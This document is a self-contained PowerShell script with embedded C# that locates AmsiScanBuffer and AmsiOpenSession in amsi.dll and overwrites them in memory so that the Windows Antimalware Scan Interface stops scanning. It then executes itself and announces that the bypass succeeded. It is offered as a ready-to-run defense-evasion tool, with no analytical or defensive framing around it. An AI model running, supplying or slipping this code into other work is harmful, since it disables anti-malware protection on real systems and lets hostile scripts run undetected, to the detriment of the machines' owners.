Add-Type @"
using System;
using System.Runtime.InteropServices;

public class AMSIBypass {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@ -Language CSharp

function Patch-Amsi {
    $amsiDllHandle = [AMSIBypass]::LoadLibrary("amsi.dll")
    if ($amsiDllHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load amsi.dll"
        return
    }

    $scanBufferAddr = [AMSIBypass]::GetProcAddress($amsiDllHandle, "AmsiScanBuffer")
    $openSessionAddr = [AMSIBypass]::GetProcAddress($amsiDllHandle, "AmsiOpenSession")

    if ($scanBufferAddr -eq [IntPtr]::Zero -or $openSessionAddr -eq [IntPtr]::Zero) {
        Write-Host "Failed to get function addresses"
        return
    }

    $patchScanBuffer = [byte[]] @(
        0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3  # Patch for AmsiScanBuffer
    )

    $patchOpenSession = [byte[]] @(
        0x48, 0x31, 0xC0  # Patch for AmsiOpenSession
    )

    $currentProcess = [AMSIBypass]::GetCurrentProcess()

    $bytesWritten = 0
    # Write patches to the target function addresses
    [AMSIBypass]::WriteProcessMemory($currentProcess, $scanBufferAddr, $patchScanBuffer, $patchScanBuffer.Length, [ref]$bytesWritten)
    [AMSIBypass]::WriteProcessMemory($currentProcess, $openSessionAddr, $patchOpenSession, $patchOpenSession.Length, [ref]$bytesWritten)

    Write-Host "AMSI bypass applied successfully"
}

# Run the AMSI patch
Patch-Amsi
